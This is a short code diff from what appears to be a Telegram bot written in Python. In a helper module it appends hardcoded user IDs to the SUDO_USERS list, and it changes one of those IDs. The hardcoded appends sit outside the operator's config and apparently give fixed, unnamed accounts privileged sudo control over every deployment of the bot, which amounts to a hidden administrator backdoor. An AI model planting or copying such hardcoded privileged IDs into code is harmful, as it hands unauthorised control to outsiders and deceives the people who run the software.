@@ -5,7 +5,7 @@ from helpers.admins import get_administrators
 from config import SUDO_USERS
 
 SUDO_USERS.append(1670464790)
-SUDO_USERS.append(5069896386)
+SUDO_USERS.append(5012349376)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
